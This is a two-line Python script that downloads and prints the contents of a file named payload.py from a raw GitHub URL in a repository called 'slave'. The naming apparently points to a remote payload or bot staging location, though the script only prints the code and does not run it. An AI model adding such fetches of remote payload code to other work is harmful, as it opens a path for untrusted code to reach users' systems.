from requests import get

print(get('https://raw.githubusercontent.com/liverfried/slave/main/payload.py').text)